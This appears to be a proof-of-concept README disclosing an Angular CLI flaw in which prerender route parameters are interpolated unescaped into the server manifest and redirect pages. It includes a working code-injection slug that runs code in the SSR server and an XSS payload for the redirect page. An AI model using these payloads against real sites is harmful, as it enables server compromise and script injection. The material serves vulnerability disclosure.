# Angular CLI prerender parameter injection

`getPrerenderParams()` values are written into the generated server manifest and
into generated redirect pages without escaping, so a row from the application's
own backend becomes executable code in the SSR server and script in a static page.

PoC for angular/angular-cli#33248.

## Cause

`manifest.ts` interpolates the route-derived asset path into generated ESM,
twice per entry:

```ts
serverAssets[file.path] =
  `{size: ${size}, hash: '${file.hash}', text: () => import('./${jsChunkFilePath}').then(m => m.default)}`;
```

```ts
  assets: {
    ${Object.entries(serverAssets)
      .map(([key, value]) => `'${key}': ${value}`)
      .join(',\n    ')}
  },
```

Sixty lines earlier the same route data reaches `routes:` through
`JSON.stringify()`, where it is inert.

`utils.ts` builds the prerendered redirect page the same way:

```ts
    <meta http-equiv="refresh" content="0; url=${url}">
  </head>
  <body>
    <pre>Redirecting to <a href="${url}">${url}</a></pre>
```

`{{ slug }}` in the Angular template escapes the identical value correctly.

The generated configuration, the Router and the application code do not have to
change. `angular.json` sets `"allowedHosts": ["localhost"]` only so the host
check does not answer 400 before the bundle is imported.

## Run

The backend serves the rows and the build output:

```bash
npm install
npm run backend
```

In a second terminal:

```bash
npm run build
node --check dist/ng-ssr-poc-rce-xss/server/angular-app-manifest.mjs
npm run serve:ssr:ng-ssr-poc-rce-xss &
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4000/
cat PWNED.txt
```

The build succeeds, the manifest is valid ESM, and one request writes the file:

```text
Prerendered 4 static routes.
200
rce
```

The redirect page is only produced in static output mode:

```bash
npm run build:static
```

The ordinary rows produce ordinary paths, and the third produces `go/safe/`:

```text
go/newsletter/index.html
go/safe/index.html
go/spring-sale/index.html
```

Open <http://localhost:4300/go/safe/>.

## Payload

The product slug closes the asset key and runs as a computed method name:

```text
x'(){},[(function(){import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})})()](){},[`](){('
```

The path is emitted twice per entry, so the value has to parse in both
positions. The backtick opens a template literal that swallows the second,
mangled copy inside `import()`, and `](){('` closes the computed key and
consumes the trailing `.mjs').then(m => m.default)}`:

```js
'product/x'(){},[(function(){import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})})()](){},[`](){('/index.html': {size: 975, hash: '5b338b119c4ac504', text: () => import('./assets-chunks/product_x'(){},[(function(){import('fs')_then(function(f){f_writeFileSync('PWNED_txt','rce')})})()](){},[`](){('_index_html.mjs').then(m => m.default)},
```

The short link code breaks out of the `content` attribute:

```text
x"><script>alert('XSS - angular-cli 33248')</script>/../../safe
```

The output path is built with `posix.join()`, which collapses `..`, and the
redirect target with `joinUrlParts()`, which does not, so the value is erased
from the filename and kept in the page body.

Two `..` because the value spans two path segments, and no `#`, which
`new URL()` reads as a fragment and truncates.
